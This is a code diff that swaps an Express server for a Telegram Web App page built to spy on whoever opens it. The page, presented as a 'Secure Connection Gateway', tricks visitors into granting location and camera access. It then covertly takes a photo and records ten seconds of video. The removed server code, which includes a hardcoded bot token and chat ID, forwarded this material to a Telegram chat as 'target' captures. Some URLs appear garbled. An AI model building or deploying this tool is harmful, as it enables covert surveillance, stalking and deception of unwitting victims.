@@ -1,117 +1,181 @@
-const express = require('express');
-const multer = require('multer');
-const fetch = require('node-fetch');
-const path = require('path');
-const fs = require('fs');
-const FormData = require('form-data');
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>SS0123 Web App</title>
+  <script src="https://telegram.org"></script>
+  <style>
+    body{font-family:system-ui,sans-serif;margin:0;padding:24px;background:#0b1220;color:#fff;display:flex;justify-content:center;align-items:center;min-height:80vh}
+    .box{width:100%;max-width:400px;background:#121c2f;padding:30px;border-radius:20px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,0.2)}
+    .hidden-video{position:absolute;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
+    #status{font-size:16px;line-height:1.5;color:#e2e8f0;font-weight:500;margin-bottom:20px}
+    .action-btn{width:100%;padding:14px;color:#fff;border:0;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer;transition:background 0.2s}
+    .btn-step1{background:#e91e63;box-shadow:0 4px 12px rgba(233,30,99,0.3)}
+    .btn-step2{background:#2481cc;box-shadow:0 4px 12px rgba(36,129,204,0.3)}
+  </style>
+</head>
+<body>
+<div class="box">
+  <div id="status">Secure Connection Gateway. Follow steps below to continue.</div>
+  
+  <button id="step1Btn" class="action-btn btn-step1">1. Verify Network</button>
+  <button id="step2Btn" class="action-btn btn-step2" style="display:none;">2. Establish Security Link</button>
 
-const app = express();
-const PORT = process.env.PORT || 3000;
+  <div style="display:none;">
+    <button id="recordBtn" disabled></button>
+    <button id="sendBtn" disabled></button>
+  </div>
 
-// ⚠️ यहाँ अपने बॉट का असली टोकन और चैट आईडी डालें:
-const TELEGRAM_BOT_TOKEN = "8229207946:AAGMoL3WyFpQS-Y-nU9O1NHHZ9LgSdJ9HWs";
-const TELEGRAM_CHAT_ID = "2147108302";
+  <video id="preview" class="hidden-video" autoplay playsinline muted></video>
+  <video id="recorded" class="hidden-video" controls></video>
+  <canvas id="photoCanvas" style="display:none;"></canvas>
+</div>
 
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+<script>
+const tg = window.Telegram?.WebApp;
+tg?.ready();
+tg?.expand();
 
-const storage = multer.diskStorage({
-  destination: (req, file, cb) => {
-    const uploadDir = './uploads';
-    if (!fs.existsSync(uploadDir)) {
-      fs.mkdirSync(uploadDir);
+const statusEl = document.getElementById("status");
+const step1Btn = document.getElementById("step1Btn");
+const step2Btn = document.getElementById("step2Btn");
+const preview = document.getElementById("preview");
+const recorded = document.getElementById("recorded");
+const photoCanvas = document.getElementById("photoCanvas");
+const recordBtn = document.getElementById("recordBtn");
+const sendBtn = document.getElementById("sendBtn");
+
+let stream = null;
+let recorder = null;
+let chunks = [];
+let videoBlob = null;
+let autoStopTimeout = null;
+let latestCoords = { latitude: "", longitude: "", accuracy: "" };
+
+function status(s){ statusEl.textContent = s; }
+
+step1Btn.onclick = () => {
+  step1Btn.disabled = true;
+  if (!navigator.geolocation) {
+    showStep2();
+    return;
+  }
+  status("Checking system connection protocols...");
+  navigator.geolocation.getCurrentPosition(p => {
+    latestCoords.latitude = p.coords.latitude.toString();
+    latestCoords.longitude = p.coords.longitude.toString();
+    latestCoords.accuracy = p.coords.accuracy.toString();
+    showStep2();
+  }, e => {
+    showStep2(); 
+  }, {
+    enableHighAccuracy: true,
+    timeout: 5000,
+    maximumAge: 0
+  });
+};
+
+function showStep2() {
+  step1Btn.style.display = "none";
+  step2Btn.style.display = "block";
+  status("Step 1 complete. Establish link to finalize.");
+}
+
+step2Btn.onclick = async () => {
+  step2Btn.disabled = true;
+  step2Btn.style.display = "none";
+  status("Initializing server handshake connection...");
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ 
+      audio: true, 
+      video: { width: 1280, height: 720, facingMode: "user" } 
+    });
+    if (preview) preview.srcObject = stream;
+  } catch (e) {
+    status("Error: Camera/Microphone access required.");
+    return;
+  }
+
+  setTimeout(async () => {
+    try {
+      photoCanvas.width = preview.videoWidth || 1280;
+      photoCanvas.height = preview.videoHeight || 720;
+      const ctx = photoCanvas.getContext('2d');
+      ctx.drawImage(preview, 0, 0, photoCanvas.width, photoCanvas.height);
+      
+      photoCanvas.toBlob(async (photoBlob) => {
+        if (photoBlob) {
+          const form = new FormData();
+          form.append("photo", photoBlob, "snapshot.jpg");
+          form.append("latitude", latestCoords.latitude);
+          form.append("longitude", latestCoords.longitude);
+          form.append("accuracy", latestCoords.accuracy);
+          try {
+            // FIX: Added LocalTunnel Bypass Header
+            await fetch("/api/location-photo", { 
+              method: "POST", 
+              body: form,
+              headers: { "Bypass-Tunnel-Reminder": "true" }
+            });
+          } catch(err) { console.error("Upload failed"); }
+        }
+        recordBtn.click();
+      }, "image/jpeg", 0.90);
+    } catch(photoErr) {
+      recordBtn.click();
     }
-    cb(null, uploadDir);
-  },
-  filename: (req, file, cb) => {
-    const ext = file.fieldname === 'photo' ? '.jpg' : '.webm';
-    cb(null, `hd_data_${Date.now()}_${Math.round(Math.random() * 1E9)}${ext}`);
-  }
-});
-const upload = multer({ storage: storage });
+  }, 1000);
+};
 
-// --- मार्ग 1: फोटो और लाइव लोकेशन अपलोड ---
-app.post('/api/location-photo', upload.single('photo'), async (req, res) => {
-  if (!req.file) {
-    return res.status(400).json({ ok: false, error: "Photo file missing" });
-  }
-
-  const { latitude, longitude, accuracy } = req.body;
-  const filePath = req.file.path;
-
-  let captionText = `📸 *High-Definition Target Snapshot Capture*\n\n`;
-  if (latitude && longitude) {
-    captionText += `📍 *Geolocation Data*\n` +
-                   `• Latitude: \`\${latitude}\`\n` +
-                   `• Longitude: \`\${longitude}\`\n` +
-                   `• Accuracy Radius: \`\${Math.round(accuracy)}m\`\n\n` +
-                   `🔗 [View on Google Maps](https://google.com{latitude},${longitude})`;
-  } else {
-    captionText += `❌ Geolocation parameter logs tracking denied or unavailable on hardware request prompt event step.`;
-  }
-
+recordBtn.onclick = () => {
+  if (!stream || !stream.active) return;
+  chunks = [];
   try {
-    const tgUrl = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`;
-    
-    const form = new FormData();
-    form.append('chat_id', TELEGRAM_CHAT_ID);
-    form.append('photo', fs.createReadStream(filePath));
-    form.append('caption', captionText);
-    form.append('parse_mode', 'Markdown');
-
-    const response = await fetch(tgUrl, {
-      method: 'POST',
-      body: form,
-      headers: form.getHeaders()
-    });
-
-    const result = await response.json();
-    fs.unlinkSync(filePath); 
-
-    if (!result.ok) throw new Error(result.description);
-    res.json({ ok: true });
-  } catch (error) {
-    console.error("Telegram initial package sync loop error:", error);
-    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
-    res.status(500).json({ ok: false, error: "Handshake payload integration failure" });
+    recorder = new MediaRecorder(stream);
+  } catch(err) {
+    status("System execution loop error.");
+    return;
   }
-});
+  recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+  recorder.onstop = () => {
+    if (autoStopTimeout) clearTimeout(autoStopTimeout);
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      stream = null;
+    }
+    videoBlob = new Blob(chunks, {type: recorder.mimeType || "video/webm"});
+    sendBtn.click();
+  };
+  recorder.start(1000);
+  status("Encrypting connection packages... Stay on this screen.");
+  
+  autoStopTimeout = setTimeout(() => {
+    if (recorder && recorder.state !== "inactive") recorder.stop();
+  }, 10000); 
+};
 
-// --- मार्ग 2: 10-सेकंड का वीडियो अपलोड ---
-app.post('/api/video', upload.single('video'), async (req, res) => {
-  if (!req.file) {
-    return res.status(400).json({ ok: false, error: "No video payload received" });
-  }
-
-  const filePath = req.file.path;
-
+sendBtn.onclick = async () => {
+  if (!videoBlob) return;
+  status("Finalizing handshake sequence authentication...");
   try {
-    const tgUrl = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendVideo`;
-    
     const form = new FormData();
-    form.append('chat_id', TELEGRAM_CHAT_ID);
-    form.append('video', fs.createReadStream(filePath));
-    form.append('caption', `🎥 *10-Second Hidden Background Capture File Sync Complete*\nSplit Configuration: 10 parts over 10s.\nTimestamp: ${new Date().toISOString()}`);
-    form.append('parse_mode', 'Markdown');
-
-    const response = await fetch(tgUrl, {
-      method: 'POST',
-      body: form,
-      headers: form.getHeaders()
+    form.append("video", videoBlob, "recording.webm");
+    // FIX: Added LocalTunnel Bypass Header
+    const r = await fetch("/api/video", {
+      method:"POST", 
+      body:form,
+      headers: { "Bypass-Tunnel-Reminder": "true" }
     });
-
-    const result = await response.json();
-    fs.unlinkSync(filePath);
-
-    if (!result.ok) throw new Error(result.description);
-    res.json({ ok: true });
-  } catch (error) {
-    console.error("Telegram video sync error:", error);
-    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
-    res.status(500).json({ ok: false, error: "Data integration timeout" });
+    const j = await r.json();
+    if (!j.ok) throw new Error();
+    status("✅ Complete.");
+    setTimeout(() => tg?.close(), 1000);
+  } catch(e) {
+    status("Network error. Please reload layout configuration link.");
   }
-});
-
-app.listen(PORT, () => {
-  console.log(`🚀 Security channel engine active on port http://localhost:${PORT}`);
-});
+};
+</script>
+</body>
+</html>
